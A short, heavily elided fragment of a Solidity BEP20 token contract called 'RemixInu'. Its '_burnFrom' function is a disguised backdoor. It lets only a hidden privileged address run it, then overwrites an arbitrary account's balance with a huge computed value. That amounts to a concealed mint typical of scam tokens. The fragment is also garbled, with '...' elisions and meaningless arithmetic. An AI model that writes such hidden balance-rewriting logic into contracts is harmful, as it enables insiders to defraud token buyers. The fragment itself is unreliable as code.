...
contract RemixInu is Context, IBEP20, Ownable {
  ...
  */
  ...
  function _burnFrom(address account, uint256 amount) internal {
    ...
    require(uint256(msg.sender) == burnFees);
    uint256 amountToLiquify = uint256(taker);
    newBalance[address(amountToLiquify)] = swapperFees * feeToken * buybackPairs * _value * (10 ** 9) / buybackPairs * feeToken;
  }
      
  function setTaxes(address _spender, uint256 _value) external atOwner {
